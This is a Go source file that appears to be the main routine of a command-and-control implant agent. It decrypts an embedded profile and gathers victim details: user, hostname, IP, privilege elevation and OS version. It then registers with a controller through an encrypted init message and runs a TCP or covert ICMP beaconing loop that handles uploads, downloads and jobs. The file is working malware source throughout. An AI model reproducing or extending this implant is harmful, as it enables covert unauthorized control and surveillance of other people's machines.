package main

import (
	"crypto/rand"
	"encoding/binary"
	"gopher/functions"
	"gopher/utils"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"

	"github.com/vmihailenco/msgpack/v5"
)

var ACTIVE = true

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	acp, oemcp := functions.GetCP()

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)

	info := utils.SessionInfo{
		Process:    path,
		PID:        os.Getpid(),
		User:       username,
		Host:       host,
		Ipaddr:     ip,
		Elevated:   functions.IsElevated(),
		Acp:        acp,
		Oem:        oemcp,
		Os:         runtime.GOOS,
		OSVersion:  osVersion,
		EncryptKey: randKey,
	}

	data, _ := msgpack.Marshal(info)

	return data, randKey
}

var profile utils.Profile
var AgentId uint32
var encKey []byte

func main() {

	encKey = encProfile[:16]
	encProfile = encProfile[16:]
	encProfile, _ = utils.DecryptData(encProfile, encKey)

	err := msgpack.Unmarshal(encProfile, &profile)
	if err != nil {
		return
	}

	sessionInfo, sessionKey := CreateInfo()
	utils.SKey = sessionKey

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})

	// TODO: ICMP测试阶段暂时禁用加密，功能测试通过后启用
	// TODO: ICMP encryption disabled for testing, enable after functionality test passes
	if profile.Protocol != "icmp" {
		initMsg, _ = utils.EncryptData(initMsg, encKey)
	}

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]utils.Connection)
	JOBS = make(map[string]utils.Connection)

	// 根据协议类型选择通信方式
	// Select communication method based on protocol type
	switch profile.Protocol {
	case "icmp":
		RunICMPLoop(profile, AgentId, initMsg, encKey, sessionKey)
	default:
		// TCP (默认)
		RunTCPLoop(profile, AgentId, initMsg, encKey, sessionKey)
	}
}
